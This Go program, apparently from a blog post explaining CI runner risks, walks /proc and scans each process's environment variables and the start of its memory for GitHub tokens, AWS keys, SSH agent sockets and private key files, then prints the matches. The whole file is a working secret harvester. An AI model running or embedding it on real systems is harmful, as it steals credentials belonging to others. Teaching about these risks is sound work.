package main

// WARNING: This is a simplified educational example for a blog post.
// Reading /proc/<pid>/mem usually requires root or ptrace permissions.
//
// It demonstrates how a malicious process on a CI runner could:
//   1. Enumerate processes
//   2. Read process environment variables
//   3. Search process memory for secrets or file paths to secrets

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

var interesting = []string{
	"GITHUB_TOKEN",
	"AWS_SECRET_ACCESS_KEY",
	"AWS_ACCESS_KEY_ID",
	"SSH_AUTH_SOCK",
	"id_rsa",
	"id_ed25519",
	".pem",
	".key",
}

func main() {
	procEntries, err := os.ReadDir("/proc")
	if err != nil {
		panic(err)
	}

	for _, entry := range procEntries {
		if !entry.IsDir() {
			continue
		}

		pid := entry.Name()

		// /proc contains non-PID directories too
		if _, err := strconv.Atoi(pid); err != nil {
			continue
		}

		checkEnviron(pid)
		checkMemory(pid)
	}
}

func checkEnviron(pid string) {
	path := filepath.Join("/proc", pid, "environ")

	data, err := os.ReadFile(path)
	if err != nil {
		return
	}

	// environ entries are null-byte separated
	envVars := bytes.Split(data, []byte{0})

	for _, env := range envVars {
		s := string(env)

		for _, needle := range interesting {
			if strings.Contains(s, needle) {
				fmt.Printf("[PID %s] ENV MATCH: %s\n", pid, s)
			}
		}
	}
}

func checkMemory(pid string) {
	path := filepath.Join("/proc", pid, "mem")

	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()

	// Simplified: read only first few MB for demo purposes
	buf := make([]byte, 4*1024*1024)

	n, err := io.ReadFull(f, buf)
	if err != nil && err != io.ErrUnexpectedEOF {
		return
	}

	content := string(buf[:n])

	for _, needle := range interesting {
		if strings.Contains(content, needle) {
			fmt.Printf("[PID %s] MEMORY MATCH: %s\n", pid, needle)
		}
	}
}
